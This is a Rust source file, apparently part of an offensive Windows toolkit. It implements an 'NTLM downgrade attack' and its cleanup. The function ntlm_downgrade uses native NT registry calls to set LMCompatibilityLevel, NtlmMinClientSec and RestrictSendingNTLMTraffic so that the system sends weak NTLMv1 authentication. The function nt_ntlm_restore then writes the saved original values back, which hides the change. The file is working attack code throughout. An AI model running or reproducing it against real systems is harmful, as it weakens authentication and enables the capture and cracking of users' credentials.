use crate::{
    _print,
    helper::{get_reg_key, set_reg_key},
    win32::{def::NT_SUCCESS, winreg::nt_set_value_key},
};

#[cfg(feature = "verbose")]
use crate::win32::def::NT_STATUS;

/// Performs the NTLM downgrade attack by modifying specific registry keys.
///
/// This function adjusts the configuration of the target system to enable the use of the NTLMv1 protocol,
/// bypassing security settings that may otherwise prevent this negotiation. It modifies the following registry keys:
///
/// 1. **`LMCompatibilityLevel`** (path: `\Registry\Machine\SYSTEM\CurrentControlSet\Control\Lsa`):
///    - Sets the value to `2`, enabling the system to use NTLMv1 when acting as a client.
///
/// 2. **`NtlmMinClientSec`** (path: `\Registry\Machine\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0`):
///    - Sets the value to `0x20000000` (536870912), disabling requirements for NTLMv2 session security.
///
/// 3. **`RestrictSendingNTLMTraffic`** (path: `\Registry\Machine\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0`):
///    - Sets the value to `0`, allowing the system to send NTLM authentication traffic of any version.
///
/// During execution, the function retrieves the original values of these registry keys and stores them in the provided
/// mutable references so that they can be restored later if needed.
///
/// # Parameters
/// - `old_lm_compatibility_level`: A mutable reference to store the original value of `LMCompatibilityLevel`.
/// - `old_ntlm_min_client_sec`: A mutable reference to store the original value of `NtlmMinClientSec`.
/// - `old_restrict_sending_ntlm_traffic`: A mutable reference to store the original value of `RestrictSendingNTLMTraffic`.
///
/// # Returns
/// - `true` if all registry changes were successfully applied.
/// - `false` if any error occurred during the operation.
#[allow(unused_variables)]
pub fn ntlm_downgrade(
    old_lm_compatibility_level: &mut Option<u32>,
    old_ntlm_min_client_sec: &mut Option<u32>,
    old_restrict_sending_ntlm_traffic: &mut Option<u32>,
) {
    let mut registry_key: &str = r"\Registry\Machine\SYSTEM\CurrentControlSet\Control\Lsa";
    let mut value_name = "LMCompatibilityLevel";
    let mut value: u32 = 2;

    match get_reg_key(registry_key, value_name) {
        Ok(key_info) => {
            *old_lm_compatibility_level = key_info.value;

            let status =
                unsafe { nt_set_value_key(key_info.handle, value_name, &value.to_ne_bytes()[..]) };

            if !NT_SUCCESS(status) {
                _print!(
                    "[-] Failed to set LMCompatibilityLevel with status: {}",
                    NT_STATUS(status)
                );
            }
        }

        Err(status) => {
            _print!(
                "[-] Failed to retrieve LMCompatibilityLevel value with status: {}",
                NT_STATUS(status)
            );
        }
    }

    registry_key = r"\Registry\Machine\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0";
    value_name = "NtlmMinClientSec";
    value = 536870912;

    match get_reg_key(registry_key, value_name) {
        Ok(key_info) => {
            *old_ntlm_min_client_sec = key_info.value;

            let status =
                unsafe { nt_set_value_key(key_info.handle, value_name, &value.to_ne_bytes()[..]) };

            if !NT_SUCCESS(status) {
                _print!(
                    "[-] Failed to set NtlmMinClientSec with status: {}",
                    NT_STATUS(status)
                );
            }
        }
        Err(status) => {
            _print!(
                "[-] Failed to retrieve NtlmMinClientSec value with status: {}",
                NT_STATUS(status)
            );
        }
    }

    registry_key = r"\Registry\Machine\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0";
    value_name = "RestrictSendingNTLMTraffic";
    value = 0;

    match get_reg_key(registry_key, value_name) {
        Ok(key_info) => {
            *old_restrict_sending_ntlm_traffic = key_info.value;

            let status =
                unsafe { nt_set_value_key(key_info.handle, value_name, &value.to_ne_bytes()[..]) };

            if !NT_SUCCESS(status) {
                _print!(
                    "[-] Failed to set RestrictSendingNTLMTraffic with status: {}",
                    NT_STATUS(status)
                );
            }
        }
        Err(status) => {
            _print!(
                "[-] Failed to retrieve RestrictSendingNTLMTraffic value with status: {}",
                NT_STATUS(status)
            );
        }
    }
}

/// Restores the NTLM authentication parameters to their previous values.
///
/// This function writes the specified values for the following registry keys:
/// - `LMCompatibilityLevel`
/// - `NtlmMinClientSec`
/// - `RestrictSendingNTLMTraffic`
///
/// # Arguments:
///
/// * `old_value_lm_compatibility_level`: The previous value of the `LMCompatibilityLevel` registry key.
/// * `old_value_ntlm_min_client_sec`: The previous value of the `NtlmMinClientSec` registry key.
/// * `old_value_restrict_sending_ntlm_traffic`: The previous value of the `RestrictSendingNTLMTraffic` registry key.
///
/// # Returns:
///
/// A `Result` indicating whether the operation was successful.
#[allow(unused_variables)]
pub fn nt_ntlm_restore(
    old_value_lm_compatibility_level: Option<u32>,
    old_value_ntlm_min_client_sec: Option<u32>,
    old_value_restrict_sending_ntlm_traffic: Option<u32>,
) {
    match set_reg_key(
        r"\Registry\Machine\SYSTEM\CurrentControlSet\Control\Lsa",
        "LMCompatibilityLevel",
        old_value_lm_compatibility_level,
    ) {
        Ok(_) => {}
        Err(err) => {
            _print!(
                "[-] Failed to restore LMCompatibilityLevel with error: {}",
                err
            );
        }
    }

    match set_reg_key(
        r"\Registry\Machine\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0",
        "NtlmMinClientSec",
        old_value_ntlm_min_client_sec,
    ) {
        Ok(_) => {}
        Err(err) => {
            _print!("[-] Failed to restore NtlmMinClientSec with error: {}", err);
        }
    }

    match set_reg_key(
        r"\Registry\Machine\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0",
        "RestrictSendingNTLMTraffic",
        old_value_restrict_sending_ntlm_traffic,
    ) {
        Ok(_) => {}
        Err(err) => {
            _print!(
                "[-] Failed to restore RestrictSendingNTLMTraffic with error: {}",
                err
            )
        }
    }
}
